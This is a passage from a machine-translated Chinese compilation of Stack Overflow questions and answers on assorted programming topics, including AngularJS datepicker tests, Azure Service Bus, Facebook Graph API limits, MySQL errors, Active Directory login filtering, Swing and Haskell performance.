    <input ng-model="request.startDate" ui-date placeholder="Start Date" />
</form> 
```

这是控制器：

```
$scope.submitForm = function(request) {
    var startDateStr = $filter('date')(request.startDate, dateFilterFormat);
    // Do something with startDateStr.

    var startYear = request.startDate.getFullYear();
    var startMonth = request.startDate.getMonth(); // 0-based.
    var startDayOfMonth = request.startDate.getDate();
    // Do something with date fields.
} 
```

我试图在我的 E2E 测试中设置输入字段，但似乎没有设置日期选择器。当我尝试访问模型时，我得到的是预期的字符串，而不是像使用 Angular UI 那样的日期对象。我最初的想法是要么通过 jquery 设置 datepicker，但我不确定我将如何在 E2E 测试中执行此操作，或者直接设置模型属性，我也不知道该怎么做。

任何人都可以提供任何见解吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-08T07:26:57.003

首先添加您的描述功能：

```
angular.scenario.dsl('jQueryFunction', function() {
    return function(selector, functionName /*, args */ ) {
        var args = Array.prototype.slice.call(arguments, 2);
        return this.addFutureAction(functionName, function($window, $document, done) {
            var $ = $window.$; // jQuery inside the iframe
            var elem = $(selector);
            if (!elem.length) {
                return done('Selector ' + selector + ' did not match any elements.');
            }
            done(null, elem[functionName].apply(elem, args));
        });
    };
}); 
```

（取自[如何从 Angular e2e 测试范围执行 jQuery？](https://stackoverflow.com/questions/16400720/how-to-execute-jquery-from-angular-e2e-test-scope)）

然后打开并选择日期使用：

```
jQueryFunction('#datepickerElementId', "focus");
jQueryFunction('ul.dropdown-menu span:contains("07")', "click"); 
```

其中 datepickerElementId 是 html/模板中 datepicker 元素的 id。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-23T16:09:06.003

对我来说，[元素（选择器，标签）。{方法}（值）](http://docs.angularjs.org/guide/dev_guide.e2e-testing#api_element)正在工作。

在coffeescript中我做了一个小帮手：

```
@UiDateHelper =
  selectCalendarDay: (day) ->
    element("[ui-date] a:contains('#{day}')").click()

  selectCalendarYear: (year) ->
    element('[data-handler="selectYear"]').val(year)

  selectCalendarMonth: (month) ->
    element('[data-handler="selectMonth"]').val(month - 1)

  selectDate: (date) ->
    year = date.substr(0, 4)
    month = date.substr(5, 2)
    day = date.substr(8, 2)
    @selectCalendarYear(year)
    @selectCalendarMonth(month)
    @selectCalendarDay(day)

UiDateHelper.selectDate('2014-01-21') 
```

希望这很有用。

# azure - 如何处理 Azure 服务总线上的消息正文类型

> ID：15750969
> 
> 赞同：3
> 
> 时间：2013-04-01T20:09:18.113
> 
> 标签：azure, servicebus

在将 azureRxMessage.GetBody 类型从 int 更改为 string 后，我正在编写一些测试代码，但出现错误`azure "Expecting element 'string' from namespace 'http://schemas.microsoft.com/2003/10/Serialization/'.. Encountered 'Element' with name 'int', namespace 'http://schemas.microsoft.com/2003/10/Serialization/'. "}`。

在查看此内容时，似乎总线正在存储所有先前发送的项目，因此期待一个字符串，但正在读取一个 int（如之前发送的那样）。该行`var msg = azureRxMessage.GetBody<string>();`引发了错误。

我的问题是：

1.  处理消息的最佳方式是什么？将正文作为字符串（序列化为 JSON）或标准数据合同发送？

2.  如果客户端开始向总线发送格式不正确的消息并开始毒害总线，会发生什么情况？我们如何防止这种情况发生？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-07T13:23:28.347

您可能需要能够部署对消息定义的更改，而不会首先使队列干涸（或让新类型的消息进入其他队列），因此在接收方使用调度程序之类的东西是一个很好的途径。您可以将消息类型的版本号放在[消息元数据属性上](http://msdn.microsoft.com/en-us/library/microsoft.servicebus.messaging.brokeredmessage.properties.aspx)这可以指示消息的版本号，然后使用该信息来了解要将正文反序列化为哪种类型的对象。或者您可以首先将消息的内容作为字符串提取，并在反序列化之前使用它来确定消息的版本。或者，您可以简单地将 JSON 正文加载反序列化为动态对象，并让您的代码查看它以确定如何处理它。所有这些方法只是意味着要在代码中出现的不同类型的消息中幸存下来，需要能够检测传递了哪种类型的允许正文，以便它可以进行相应的处理。

对于问题二，Service Bus Brokered 消息传递确实具有内置的有害消息处理功能。如果您在 Queue 或 Subscription 上设置[MaxDeliveryCount 属性](http://msdn.microsoft.com/en-us/library/microsoft.servicebus.messaging.queuedescription.maxdeliverycount.aspx)，如果尝试传递的消息超过此次数，它将自动死信。您还可以更加主动，当您看到不喜欢的消息正文时，可以直接调用[Deadletter](http://msdn.microsoft.com/en-us/library/windowsazure/microsoft.servicebus.messaging.queueclient.deadletter.aspx)。

# android - 是否可以在 Google Play 上为应用程序的评论/评级自动发送电子邮件？

> ID：15750971
> 
> 赞同：1
> 
> 时间：2013-04-01T20:09:27.190
> 
> 标签：android, email, console, rating-system

我刚刚为我在大学的最后一年项目创建了我的第一个安卓游戏！自从我发表它以来，我得到了一些评论和评分。

一旦在应用程序上标记了评论或评分，是否可以设置自动发送电子邮件！

我是 Google Play 开发者控制台的新手，所以我可能错过了这个选项。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:13:41.713

我认为开发者控制台中没有设置可以做到这一点。而且 AFAIK 仍然没有用于开发者控制台的官方 API，因此没有合法的方式来自己设置一个。如果您想知道何时有新评论，您只需要继续检查即可。

# uml - 如何在 Magic Draw 中创建对象图？

> ID：15750973
> 
> 赞同：2
> 
> 时间：2013-04-01T20:09:33.800
> 
> 标签：uml, magic-draw, object-diagram

我想在 Magic Draw 16.0 版中创建现有类图的对象图。我怎样才能做到这一点？Magic Draw 的官方支持在论坛中写道“你所说的对象图是什么意思”，所以我不希望该网站有任何帮助 :-)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T15:33:20.073

就在这里。右键单击“包含树”中显示的包后，可以从上下文菜单中使用它。

![上下文菜单条目](https://i.stack.imgur.com/GcKmf.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T08:28:42.277

Magic Draw 16.0 版中没有专门的“对象图”。相反，创建另一个类图并使用`Instance`和`Link`元素，如图所示。对于 > 16.0 的版本，请检查其他答案。

![在此处输入图像描述](https://i.stack.imgur.com/kMO4R.gif)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-02T17:47:32.870

在 MD 17.0.1 之前，要获得对象图，您必须制作一个内部只有实例和链接的类图。

# opencv - 使用带有 OPENCV 的 COM 端口时屏幕冻结

> ID：15750977
> 
> 赞同：0
> 
> 时间：2013-04-01T20:09:44.567
> 
> 标签：opencv

我正在尝试通过 openCV 使用颜色检测来运行电机，并通过蓝牙与我的处理器板进行通信。

```
// create serial port
myPort = new SerialPort();

// open serial port
myPort->openPort("COM6", 9600, "8n1");

int rightside = (frame_width/2) - 30;
int leftside = (frame_width/2) + 30;
if(posX>leftside)
        {
            printf("Go Left \n");
            SendRobotLeft();
        }
        else if(posX<rightside)
        {
            printf("Go Right \n");
            SendRobotRight();
        }
        else
        {
            printf("Go Forward \n");
            SendRobotForward();
        }

void SendRobotRight()
{
  myPort->send("R", 1);
} 
```

同样，我为其他人做了。我的设备管理器说 COM5 和 COM6 用于蓝牙上的串行通信链接。当我通过 COM5 运行它时，它可以工作，但是如果我尝试查看使用高级串行监视器发送的数据，它无法打开 COM5，因为它正在被其他应用程序使用。

它会打开 COM6，但是当我尝试在 COM6 中运行程序时，我的视频窗口不显示任何内容并且颜色显示为灰色。

有什么建议我可能错了吗？

# sublimetext2 - 按回车键时自动缩进新行以扩展 HTML 中的单行标签

> ID：15750978
> 
> 赞同：2
> 
> 时间：2013-04-01T20:09:51.793
> 
> 标签：sublimetext2

我想让这个工作流程在 Sublime Text 2 中使用 HTML：

1.  创建 HTML 标签（例如 ctrl + shift + W）
2.  TAB（将光标放在内容区域）
3.  进入

结果是（单词“HERE”表示光标应该在哪里）：

```
<p>
    HERE
</p> 
```

但相反，这就是我得到的（“这里”这个词仍然表示光标的位置）：

```
<p>
HERE</p> 
```

这要求你

1.  输入（再次）
2.  向上箭头 + TAB
3.  ARROW-UP + TAB（第二次）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-02T04:57:52.107

尝试在您的用户键绑定中添加以下内容。

```
{ "keys": ["enter"], "command": "insert_snippet", "args": {"contents": "\n\t$0\n"}, "context":
    [
        { "key": "setting.auto_indent", "operator": "equal", "operand": true },
        { "key": "selector", "operator": "equal", "operand": "meta.scope.between-tag-pair", "match_all": true },
        { "key": "selection_empty", "operator": "equal", "operand": true, "match_all": true }
    ]
} 
```

# vb.net - UltraGrid 修改新行列

> ID：15750988
> 
> 赞同：0
> 
> 时间：2013-04-01T20:10:30.320
> 
> 标签：vb.net, button, infragistics, ultrawingrid

我有一个`UltraGrid`您可以通过在顶部的空白行中填写信息来添加一行。我想修改该行，以便在末尾看不到这样的按钮（在灰线的末尾）：

![在此处输入图像描述](https://i.stack.imgur.com/Y5TGR.png)

我找不到只在哪里修改这一行。任何的想法 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T14:28:16.677

有一个名为的事件`InitializeTemplateAddRow`旨在自定义`TemplateAddRow`（这是该行的名称）。
尽管单元格具有`Hidden`属性，但我无法隐藏 TemplateAddRow 的特定单元格而不隐藏整个列，但是您可以使用事件处理程序中的此代码轻松禁用特定单元格：

```
Imports Infragistics.Shared
Imports Infragistics.Win
Imports Infragistics.Win.UltraWinGrid

Private Sub UltraGrid1_InitializeTemplateAddRow(ByVal sender As Object, _
     ByVal e As Infragistics.Win.UltraWinGrid.InitializeTemplateAddRowEventArgs) _
     Handles UltraGrid1.InitializeTemplateAddRow
    ' Initialize the template add-row. You can set the default values for the cells
    ' in the add-row. When the user adds a new row through the template add-row, the
    ' new row will be initialized with these default values. 

    ' e.TemplateAddRow.Cells(0).Value = -1

    ' or totally disable the cells that that you don't want to use (e.g buttons like cells)

     e.TemplateAddRow.Cells["Key"].Activation = Activation.Disabled
End Sub 
```

# javascript - Facebook Graph Api 中的 gr:get:User 是什么？达到应用程序限制错误

> ID：15750991
> 
> 赞同：3
> 
> 时间：2013-04-01T20:10:43.997
> 
> 标签：javascript, asp.net-mvc, facebook, facebook-graph-api, facebook-c#-sdk

我有一个使用 facebook 的 javascript 和 c# sdk 的应用程序。有一天，我`error 4 : Application request limit reached.`在 facebook 应用程序仪表板中看到了这个。

```
Too Many Calls  - 1 hour, 50 minutes

Method                         Fraction of Budget
gr:get:User                     115%
gr:get:Post/likes               6.3%
gr:get:User/likes               0.26%
gr:post:Event/attending         0.05%
ui:permissions.request:popup:p  0.01%
ui:feed:iframe:post:            0.01%
gr:get:/schema                  0%
ui:permissions.request:async:g  0% 
```

我假设在 `gr:get:User`“gr”中表示图形。那么`get:User` 我想必须仅限于来自 javascript sdk 的调用

```
FB.api('/me', function (data) { ... 
```

从 javascript sdk 登录用户也会进行相同的`get:User`调用吗？？？？

```
 FB.login(function (response) { ....... 
```

这些只是添加到 gr:get:User 调用的方法吗？是否可能 get:User 是所有 get:Likes + get:Posts + get:Friends 的总和？这似乎没有意义，因为我们达到了获取用户请求的限制。

我们确实有一些页面在单个页面上最多有 40 个喜欢，现在我们有它（不是一个好方法，并且会改变）我们用来呈现这些喜欢的按钮，并在*每个*喜欢`<fb:Like ...`旁边我们采取的行动

 *```
 $(function () {
        (function (d, s, id) {
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.getElementById(id)) return;
            js = d.createElement(s); js.id = id;
            js.src = "https://connect.facebook.net/en_US/all.js#xfbml=1&appId=@ConfigSettings.FacebookAppId";
            fjs.parentNode.insertBefore(js, fjs);
        } (document, 'script', 'facebook-jssdk')); 
```

所以这意味着对于每个like 按钮，facebook 都有一个 ajax 调用，并且目前它正在调用多达 40 次从 facebook 获取 all.js 文件。这些算作 gr:get:User 调用吗？他们可以增加达到限制的呼叫数量吗？

**更新**

我问我们代码中的哪些调用触发了 gr:get:user 的原因是因为据我所知，它看起来像是一个恶意用户试图重复登录。我只是在寻找确认没有其他图形 api 调用可以添加到 gr:get:User 计数中。

当我们调用从 javascript sdk 登录用户时，您发送的所有内容都是您的应用程序 ID，因此我无法设置不同的访问令牌。一旦用户登录，我们就使用用户身份验证令牌

**再次更新**

我们得到了`error 4 : Application request limit reached.`再次，每当任何用户试图从这个应用程序向 facebook 进行任何调用时，都会抛出这个问题。这不是每个（用户，应用程序）错误。任何机构都知道是什么原因造成的或如何预防？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-11T19:14:42.303

基本上你是对的，每个 Like 按钮都会请求用户信息，以显示已经喜欢此页面的朋友。

我认为您可以尝试**通过 facebook js sdk 插入 Like 按钮，**并且**只有在您加载 all.js 脚本之后**。在这种情况下，您将避免对 all.js 的额外请求，也将避免对用户信息的额外请求，因为它将被 js sdk 缓存在客户端。*

# asp.net - 字段列表中名为“”的字段不明确

> ID：15750992
> 
> 赞同：1
> 
> 时间：2013-04-01T20:10:48.793
> 
> 标签：asp.net, mysql

```
string sql = @"
 SELECT 
       sit.descricao       AS situacao, 
       pri.prioridade      AS prioridade, 
       usr.nome            AS responsavel, 
       ch.previsao_termino AS previsao, 
       ch.descricao        AS descricao, 
       clb.clube, 
       proj.descricao      AS projeto, 
       func.descricao      AS funcionalidade 
FROM   
       chamados AS ch 
LEFT JOIN 
       prioridades AS pri 
ON 
       ch.prioridade = pri.id 
INNER JOIN 
       situacoes AS sit 
ON 
       ch.situacao = sit.id 
LEFT JOIN 
       usuarios AS usr 
ON 
       ch.responsavel = usr.id 
INNER JOIN 
       clubes AS clb 
ON 
       ch.clube = clb.id 
INNER JOIN 
       projetos AS proj 
ON 
       ch.projeto = proj.id 
INNER JOIN 
       funcionalidades AS func 
ON 
      ch.funcionalidade = func.id 
WHERE  
      ch.id = @id";

MySqlCommand cmd = new MySqlCommand();
cmd.CommandText = sql;
cmd.CommandType = CommandType.Text;
cmd.Parameters.Add(new MySqlParameter("@id", MySqlDbType.Int32)).Value = _ch.ID;
DataSet retorno = _dal.Consultar(cmd);
return retorno; 
```

当它返回时它不是空的，但是当我这样做时：

```
GridView1.DataSource(retorno);
GridView1.DataBind(); //Here Fires the error. 
```

它会触发标题上的错误。我读了很多其他已经在这里打开的主题，但我看不出它在哪里模棱两可。是我的查询吗？或者可能是别的东西......它正在工作，然后我再次调试，错误被触发......

错误：

```
a field named 'prioridade' on field list is ambiguous 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T09:30:31.173

`chamados`和表都有`prioridades`一个名为 的字段`prioridade`。因此，您不能在您的`SELECT`-statement 中使用该字段名称作为别名。

尝试`pri.prioridade AS prioridad`或类似的东西。

# asp.net - 按 ASP.NET 中的 AD 安全组过滤

> ID：15750994
> 
> 赞同：1
> 
> 时间：2013-04-01T20:10:58.733
> 
> 标签：asp.net, active-directory

我有一个在 Visual Studio 2010 中使用本机身份验证控件的 .NET Framework 版本 4 开发的 ASP.NET 应用程序。我已经使用 Active Directory 成员资格提供程序连接了该站点。

我的连接字符串如下所示：

```
connectionString="LDAP://MYDC-004/DC=company,DC=corp,DC=pvt" 
```

这很好用，因为登录页面可以正常工作，并且 AD 中存在的任何用户都可以使用他们的凭据登录。

但是，我***只想***允许*一个特定安全组*中的用户能够登录。我知道安全组（称为“GR-DwgDep-Admins”）在 AD 组织单位中的位置，所以我想出了这个修改后的连接字符串：

```
connectionString="LDAP://MYDC-004/CN=GR-DwgDep-Admins,OU=Groups,OU=Division,DC=company,DC=corp,DC=pvt" /> 
```

当我尝试登录时（我肯定在这个组中），我得到的错误是“无法在指定的容器中创建用户对象”。

我的语法不正确吗？还是我在概念上这样做是错误的？我真的更喜欢通过连接字符串设置来执行此操作，因为这样现有的 .NET 登录控件将按原样使用它。

我将非常感谢任何人的任何建议。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-21T20:27:52.517

您还需要遍历用户所属的组，并检查它是否与您也想授予访问权限的组匹配。

首先你需要加载用户，然后你需要遍历“memberOf”集合并检查它们是否属于指定的组。

```
 //Get connectionstring from web.config and initialize directory entry to search for groups user belongs to
            DirectoryEntry de = new DirectoryEntry(ConfigurationManager.ConnectionStrings["ADConnectionString"].ConnectionString);

            //Specify that we want to find the groups
            DirectorySearcher ds = new DirectorySearcher(de, "(objectCategory=group)");

            //Filter by user and specify what data to return
            ds.Filter = String.Format("(&(SAMAccountName={0}))", model.UserName);
            ds.PropertiesToLoad.Add("sAMAccountName");
            ds.PropertiesToLoad.Add("memberOf");

            //Loop though all results
            foreach (SearchResult sr in ds.FindAll())
            {
                //Get the properties available and loop through "memberof"
                DirectoryEntry desr = sr.GetDirectoryEntry();
                ResultPropertyCollection myResultPropColl = sr.Properties;

                //Get a key
                foreach (string myKey in myResultPropColl.PropertyNames)
                {
                    //Check the key that we are using "memberof"
                    if (myKey.ToLower() == "memberof")
                    {
                        //Loop through all items for given key
                        foreach (System.String myCollection in myResultPropColl[myKey])
                        {
                            //Check if we have a match
                            if (myCollection.Contains("Web - Internal Admin"))
                            {
                                //Success                                   

                                de.Dispose();
                                desr.Dispose();
                                //Do something
                            }
                        }
                    }
                }
            } 
```

对于第一行，我从 web.config 获取我的 AD 连接字符串

```
ConfigurationManager.ConnectionStrings["ADConnectionString"].ConnectionString 
```

网络配置

```
<add name="ADConnectionString" connectionString="LDAP://ua.local/DC=ua,DC=local" /> 
```

然后我得到这些组并按特定的用户名过滤它。然后我指定 sAMAccountName 和 memberOf 的返回值。在此示例中，无需获取 sAMAccountName。

```
 DirectorySearcher ds = new DirectorySearcher(de, "(objectCategory=group)");

        //Filter by user and specify what data to return
        ds.Filter = String.Format("(&(SAMAccountName={0}))", model.UserName);
        ds.PropertiesToLoad.Add("sAMAccountName");
        ds.PropertiesToLoad.Add("memberOf"); 
```

其余的很容易理解。循环遍历结果并检查“memberof”键。找到后，使用“memberof”键并遍历其值并检查它是否与您需要的组匹配。

```
if (myKey.ToLower() == "memberof") 
```

检查此链接以获取更多信息： [搜索组](http://msdn.microsoft.com/en-us/library/ms180909%28v=vs.80%29.aspx)

# java - 如何管理多个windows系统-Java(Swing)

> ID：15750996
> 
> 赞同：0
> 
> 时间：2013-04-01T20:10:59.360
> 
> 标签：java, swing, user-interface, jframe, jdialog

我正在做我的第二年项目，我需要你的帮助。我想创建一个包含多个窗口的 DIY 商店系统。所有屏幕都完成了，只需要知道如何将它们一起管理 当系统启动时，会弹出一个带有公司徽标、地址、文本字段等的登录窗口。然后棘手的部分开始了，有 3 种类型的用户（管理员、销售和股票用户），每一种都有不同的主菜单（GUI）。

任何想法如何处理这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T21:04:17.520

建议您使用用户帐户上的对象来确定要显示的面板，即

admin 获得一个从 Jpanel 扩展的管理面板（可能是所有用户面板共享/扩展的基本面板），然后您将检查哪个用户帐户正在登录并加载正确的面板或面板的一部分，尽可能多地重复使用gui 面板尽可能减少代码量。这可能会在以后有所帮助，就好像您正在使用面板和用户组一样，您可以做的是...的实例

```
 Jpanel
                 |
         some base gui panel
        |           |           |
adminPanel  salesPanel    userPanel 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T14:32:50.670

```
Here is my idea for this:
to create a MainGUI.java file (JFrame) that contains
3 constructors(+ default constr) with separate GUI for each user. In the main method
I would call a login object(JDialog) and check what type of user
I'm dealing with and then create an appropriate mainGUI
object. 
```

（伪代码）请评论。

```
 class mainGUI
    //variables
    public mainGui() // default constructor
    //body
    public mainGUI(var1, var2, va3) // type1 user constructor
    //body
    public mainGUI(var1, var3, var2) // type2 user constructor
    //body
    public mainGUI(var2, var1\. var3) //type3 user constructor

    main method()
    mainGui m = new mainGUI();
    Login l1 = new Login(m);
    if(l1.getPassword() == some array value) // type1 User passwords are stored in Array1 (eg. Admin)
    then
    mainGUI m1 = new mainGUI(var1, var2, var3); // creates appropriate user gui
    else if(l1.getPassword() == some array value ) // user type2 (e.g. Sales Staff)
    then
    mainGUI m1 = new mainGUI(var1, var3, var2);
    and so on... 
```

# ios6 - 从简单的视图控制器切换到标签栏控制器有多容易？

> ID：15750997
> 
> 赞同：0
> 
> 时间：2013-04-01T20:11:05.587
> 
> 标签：ios6

我想创建一个有四个按钮的主控制器，如果按下一个按钮，它将切换视图。问题是我不知道如何实现这个，可能有错误...... PS：新视图是标签栏控制器

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T04:06:04.660

一开始我在我的故事板中尝试了 push 方法，但是有一些我不知道的错误。然后我尝试了模态，它对我有用！

# haskell - 哪些技术对 Haskell 的性能提升贡献最大？

> ID：15750998
> 
> 赞同：28
> 
> 时间：2013-04-01T20:11:07.577
> 
> 标签：haskell, ghc

90 年代后期，我在大学里学了一点 Haskell。在当时，尽管性能已经足够，而且比人们对这种高级语言的预期要好得多，但它仍然没有什么值得大书特书的地方。

事情变了。今天的 Haskell (GHC) 具有出色的性能，通常与 C/C++ 相差不远。那么，对这一改进贡献最大的编译器到底发生了什么变化？我知道几种经常使用的技术，例如更好的拆箱和严格性分析。我想对这些技术中的每一种对整体性能改进带来的定量贡献有一些粗略的了解。

如果您愿意，也可以用以下术语来描述这个问题：考虑 GHC Haskell 在 90 年代中期表现不佳的情况。为了使性能更接近 2013 GHC Haskell，需要改进的前 5 个方面是什么？

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2013-04-02T08:09:22.260

> 粗略了解每种技术的定量贡献

这个问题的问题在于，在那个细节层次上它基本上是无法回答的。

15 年来，从用户代码和习惯用法到库、编译器优化、代码生成和运行时，软件堆栈的所有方面都得到了改进。几年来，性能一直是十几个开发人员的主要关注点。

结果，已经进行了数千次更改，从而产生了我们今天从 GHC 获得的性能。没有简单的清单。

这是一个快速列表，说明这个问题有多广泛和无法回答。

**编译器优化**

改进的编译器优化使全面改进，每个改进 1% 到 15%。

*   例如[指针标记](http://hackage.haskell.org/trac/ghc/wiki/Commentary/Rts/HaskellExecution/PointerTagging)（提高[14%](http://research.microsoft.com/en-us/um/people/simonpj/papers/ptr-tag/ptr-tagging.pdf)）
*   [构造函数专业化](http://research.microsoft.com/en-us/um/people/simonpj/papers/spec-constr/spec-constr.pdf)（10% 改进）
*   一个[更健壮](http://hackage.haskell.org/trac/ghc/wiki/Inlining)的内联。

**更好的图书馆**

改进的库可以对特定领域产生巨大影响。例如，对于数组和字符串数据，我们现在拥有：

*   字节串（与列表相比[提高了 8 倍）](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.117.9065&rep=rep1&type=pdf)
*   向量
*   修复

这通常比列表版本好 10 倍。

**更好的界面**

用于编写快速代码的更好接口

*   新的[primops](http://hackage.haskell.org/trac/ghc/wiki/Commentary/PrimOps)
*   更好[的数字转换。](http://hackage.haskell.org/trac/ghc/ticket/5122)
*   [具有较低开销的](http://breaks.for.alienz.org/blog/2012/05/23/ffi-vs-primops)FFI 绑定。

**更好的工具**

用于分析性能的更好工具

*   GHC 核心
*   螺纹镜
*   更好的分析器
*   更好的 GC 工具

**运行**

运行时变得更智能——例如垃圾收集器明显更好

*   [GHC 并行 GC](http://research.microsoft.com/en-us/um/people/simonpj/papers/parallel/local-gc.pdf) ，在每个程序上再次占几%。
*   IO 线程变得[更便宜和更快](http://www.australianscience.com.au/research/google/36841.pdf)。

**代码生成**

代码生成器更好。

*   GHC 不是生成 C，而是[针对 LLVM](http://hackage.haskell.org/trac/ghc/wiki/Commentary/Compiler/Backends/LLVM/Installing) ，将一些阵列程序提高了 25%，一些提高了 100%。
*   本机代码生成器也被重写和改进。

**更好的成语**

最后，编写快速代码的习语现在[得到了更广泛的理解。](http://book.realworldhaskell.org/read/profiling-and-optimization.html)

因此，您可以命名软件堆栈中的任何位置，并且已经发生了百分之几的改进。在运行时、编译器和库设计方面也有重大突破。